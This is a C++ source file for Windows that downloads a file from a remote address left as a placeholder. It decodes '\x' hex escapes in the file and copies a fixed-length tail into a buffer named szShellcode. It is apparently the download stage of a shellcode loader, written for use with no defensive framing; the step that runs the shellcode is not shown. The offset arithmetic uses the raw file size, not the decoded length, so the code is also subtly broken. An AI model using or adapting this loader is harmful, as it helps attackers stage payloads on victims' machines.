#include <windows.h>
#include <string>
#include <urlmon.h>
#include <iostream>
#include"common.h"
#pragma comment(lib, "urlmon.lib")


void interpret_escapes(unsigned char* input, unsigned char* output) {
    unsigned char* p = input;
    unsigned char* q = output;
    while (*p) {
        if (*p == '\\' && *(p + 1) == 'x') {
            int value;
            sscanf_s((char*)p + 2, "%2x", &value);
            *q++ = (unsigned char)value;
            p += 4;
        }
        else {
            *q++ = *p++;
        }
    }
    *q = '\0';
}

unsigned char* GetFile(LPCWSTR szNetPath, LPCWSTR localPath, int Len)
{
    HRESULT hr = URLDownloadToFile(NULL, szNetPath, localPath, 0, NULL);
    if (hr != S_OK) {
        std::cerr << "Failed to download file. HRESULT: " << hr << std::endl;
        return nullptr;
    }

    HANDLE hFile = CreateFile(localPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open file. Error: " << GetLastError() << std::endl;
        return nullptr;
    }

    DWORD dwFilesize = GetFileSize(hFile, NULL);
    if (dwFilesize == INVALID_FILE_SIZE) {
        std::cerr << "Failed to get file size. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return nullptr;
    }

    unsigned char* szBuffer = new unsigned char[dwFilesize + 1];
    memset(szBuffer, 0, dwFilesize + 1);
    DWORD dwReadLength = 0;
    BOOL bReadFile = ReadFile(hFile, szBuffer, dwFilesize, &dwReadLength, NULL);
    if (!bReadFile || dwReadLength != dwFilesize) {
        std::cerr << "Failed to read file. Error: " << GetLastError() << std::endl;
        delete[] szBuffer;
        CloseHandle(hFile);
        return nullptr;
    }
    szBuffer[dwFilesize] = '\0';  

    unsigned char* interpreted = new unsigned char[dwFilesize + 1]; 
    interpret_escapes(szBuffer, interpreted);

    DWORD dwIndex = dwFilesize - Len;
    unsigned char* szShellcode = new unsigned char[Len];

    memcpy(szShellcode, (interpreted + dwIndex), Len);

    delete[] szBuffer;
    delete[] interpreted;
    CloseHandle(hFile);

    return szShellcode;
}

//int main()
//{
//    LPCWSTR szUrl = L"Your remote address";
//    LPCWSTR localPath = L"download.txt";
//    DWORD fileSize = "Your fixed file size here";
//    unsigned char* mychar = GetFile(szUrl, localPath, fileSize);
//   
//}
